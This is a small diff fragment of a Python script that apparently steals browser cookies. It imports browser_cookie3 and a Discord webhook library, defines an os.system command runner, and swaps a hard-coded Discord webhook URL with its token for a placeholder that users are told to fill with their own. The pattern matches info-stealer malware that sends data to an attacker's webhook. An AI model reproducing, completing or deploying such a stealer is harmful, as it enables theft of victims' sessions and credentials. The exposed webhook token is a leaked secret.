@@ -7,7 +7,8 @@ from discordwebhook import *
 import browser_cookie3
 import ctypes
 
-webhookk = "https://discord.com/api/webhooks/1008394329414438982/AYt4U7HSkAH54JygHuCh4RqyCyhg4IXjIy5xCqr6KiYoXwatDGn4nbrN6sdU1Wmkoe0k"
+#CHANGE THE HOOKLINK TO YOUR DISCORD WEBHOOK LINK
+webhookk = "hooklink"
 
 def command(c):
     os.system(c)
